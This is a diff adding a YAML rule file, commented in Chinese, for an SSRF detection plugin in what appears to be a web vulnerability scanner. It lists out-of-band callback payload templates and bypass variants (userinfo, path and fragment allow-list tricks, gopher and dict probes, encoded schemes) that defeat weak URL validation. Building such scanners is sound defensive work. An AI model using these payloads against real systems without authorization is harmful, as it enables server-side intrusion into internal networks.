@@ -1,0 +1,78 @@
+# SSRF（服务端请求伪造 / Server-Side Request Forgery）规则库。
+#
+# 这个文件只放“检测用什么 payload”，不放调度逻辑。
+# rules.py 是很薄的加载器，把 {domain} {value} {allow} 这些占位符替换成实际值。
+#
+# 设计目标：覆盖面广、通用性强、检出率高，同时把误报压到最低。
+#
+# 【SSRF 是什么】参数里包含一个 URL / 主机 / IP，服务端会拿它去发起请求（图片代理、
+# URL 预览、Webhook 测试、PDF 生成、导入远程文件…）。攻击者借此让服务端去访问它本不该
+# 访问的目标：内网服务、云元数据、本地文件。检测的核心是证明“服务端真的按我给的地址发了
+# 一次请求”，而不是参数被原样回显。
+#
+# 【只做带外（OOB）确认——最通用、覆盖面最广的一种】
+#   把参数替换成指向我们控制的唯一子域的 URL，服务端一旦去请求（DNS 解析或 HTTP 拉取），
+#   就会回连 interactsh 公共服务，我们轮询到带对应 token 的交互即确认。它完全不依赖响应是否
+#   回显，覆盖“盲打 SSRF”（绝大多数真实场景）；回连来源 IP 是目标服务器而非我们，天然证明
+#   是“服务端”发起。见 oob.py + tools/interactsh_client.py。
+#
+#   不做“响应回显/云元数据”那一套：那类只在“目标恰好在某云 + 应用会回显抓取内容”时才触发，
+#   很窄；而应用一旦回显，OOB 本来就命中了。它并不拓宽“能不能发现 SSRF”，只是危害确认/无出网
+#   兜底的小补充，收益低还要多发一批固定 IP 的请求，因此这里不做，保持插件通用、精简。
+#
+# 【绕过写法：直接并进基础 payload】
+#   SSRF 每个注入点需要发送的请求本来就不多（带外每个变体一个唯一域名），所以把最有效的绕过
+#   直接写进 payload 模板，不另设独立 tamper 阶段：多协议、无协议裸主机、协议相对、userinfo/
+#   路径/片段白名单绕过、子域名拼接击穿、非 http 协议、大小写/URL 编码 scheme 等，一轮覆盖。
+
+# ---------------------------------------------------------------------------
+# 带外（OOB）payload 模板。
+#   {domain} 是 interactsh 分配的唯一子域，服务端只要去请求它（哪怕只做 DNS 解析）就回连。
+#   {value}  是参数原值（用于“在原 URL 里替换主机、保留路径”的场景，由 scanner 处理）。
+#   {allow}  是目标站点自身的主机名，用于“URL 里必须出现某允许主机”的白名单绕过。
+#
+# 覆盖多种“服务端如何用这个参数拼请求”的落点（sink）形态，尽量广：
+#   a. 参数本身就是完整 URL         -> http(s)://{domain}/
+#   b. 服务端自己拼 http:// 前缀     -> 裸主机 {domain}
+#   c. 只判断“不含 http”等关键字     -> 协议相对 //{domain}/
+#   d. 白名单校验“URL 里有允许主机”  -> userinfo / 路径 / 片段里塞入 {allow}，真实 host 仍是 {domain}
+#   e. 服务端把参数当子域名拼接       -> {domain}# 让 .trusted 落到片段里（见 extra）
+#   f. 非 http 协议的抓取器(curl 等)  -> gopher/dict，至少触发 DNS 回连（见 extra）
+#   g. 大小写/URL 编码 scheme 过滤   -> HTTP:// / http%3a%2f%2f，绕关键字与一次/二次解码（见 extra）
+#
+# 【重要】所有变体真正被解析出的 host 都必须是 {domain}（我们的域名），否则永远不会回连、
+# 白发一次请求。userinfo/路径/片段绕过之所以有效，就是让 {allow} 只“出现在字符串里”骗过
+# 弱校验，而 URL 解析器算出的 host 仍是 {domain}。
+# ---------------------------------------------------------------------------
+oob_templates:
+  # a. 完整 URL（最常见：参数本身就是一个待请求的 URL）
+  - { name: http_full,        template: 'http://{domain}/' }
+  - { name: https_full,       template: 'https://{domain}/' }
+  # b. 无协议裸主机（服务端会自己拼 http:// 前缀的场景）
+  - { name: bare_host,        template: '{domain}' }
+  # c. 协议相对（绕过“不能包含 http”这类关键字过滤）
+  - { name: scheme_relative,  template: '//{domain}/' }
+  # d. userinfo 白名单绕过：http://<目标自身主机>@<带外域名>/。
+  #    真实 host 是 @ 后面的 {domain}，{allow} 只是 userinfo，骗过“URL 要以允许主机开头/包含它”的弱校验。
+  - { name: userinfo_bypass,  template: 'http://{allow}@{domain}/' }
+
+# 开启 full_payload_scan 或 deep_tamper 时额外追加的带外变体，进一步拓宽落点/绕过覆盖。
+# 每个都要占用一个唯一域名 + 一次请求。
+oob_templates_extra:
+  # d'. 白名单主机出现在路径里，真实 host 仍是 {domain}（绕过“URL 包含允许主机”的校验）。
+  - { name: allow_in_path,     template: 'http://{domain}/{allow}' }
+  # d''. 白名单主机出现在片段里（# 之后一律是 fragment，host 一定是 {domain}）。
+  - { name: allow_in_fragment, template: 'http://{domain}#{allow}' }
+  # e. 子域名拼接型 sink 的击穿：服务端做 http://{value}.trusted/ 时，{value}={domain}# 让
+  #    ".trusted" 落进 fragment，真实 host 变成 {domain}。
+  - { name: subdomain_break,   template: '{domain}#' }
+  # f. 非 http 协议：libcurl 系抓取器支持多协议，服务端解析主机时至少会 DNS 解析 {domain}，
+  #    触发 DNS 回连即可确认出站（也可能打到内网 TCP）。
+  - { name: gopher_probe,      template: 'gopher://{domain}:80/_ssrf' }
+  - { name: dict_probe,        template: 'dict://{domain}:11211/stat' }
+  # g. scheme 变形绕过（原先的 tamper，现直接并进 payload）：
+  #    大写协议绕过按字面 "http" 的关键字过滤；单/双 URL 编码绕过“解码一次/两次后再校验”。
+  #    这些变体解码后的 host 仍是 {domain}。
+  - { name: upper_scheme,      template: 'HTTP://{domain}/' }
+  - { name: enc_scheme,        template: 'http%3a%2f%2f{domain}%2f' }
+  - { name: dbl_enc_scheme,    template: 'http%253a%252f%252f{domain}%252f' }
